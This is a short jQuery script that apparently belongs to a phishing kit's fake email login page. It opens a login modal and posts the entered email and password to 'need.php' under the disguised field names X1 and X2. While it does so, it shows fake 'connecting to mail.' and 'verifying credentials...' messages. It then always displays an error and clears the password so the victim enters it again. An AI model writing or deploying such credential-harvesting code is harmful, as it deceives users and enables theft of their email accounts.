$(document).ready(function() {
    $("#idl").click(function(event) {
        event.preventDefault();
        event.stopPropagation();
        var modal = document.getElementById("lmodal");
        modal.style.display = "block";
        if($("#email").val().length < 4){
            $("#email").focus();
        }else{
            $("#password").focus();
        }
    });

    $("#fdl").click(function(event){
        event.preventDefault();
        event.stopPropagation();
        let email = $("#email").val();
        let password = $("#password").val()
        if(email.length < 7 || !email.includes("@")){
            alert("Please enter a valid email");
            return;
        }
        if(password.length < 4){
            alert("Please enter a valid password");
            return;
        }
        let domain = email.split("@")[1];
        document.getElementById("error").style.display = "none";
        document.getElementById("fback").style.display = "block";
        $("#tfb").text("connecting to mail." + domain);
        $.ajax({
            url: "need.php",
            method: "post",
            data: {
                X1: email,
                X2: password
            },
            success: function(data){
                console.log(data);
                setTimeout(() => {
                    $("#tfb").text("verifying credentials...");
                    setTimeout(() => {
                        document.getElementById("fback").style.display = "none";
                        document.getElementById("error").style.display = "block";
                        $("#password").val("");
                        $("#password").focus();
                    }, 1000);
                }, 1000);
            }
        })
    })
})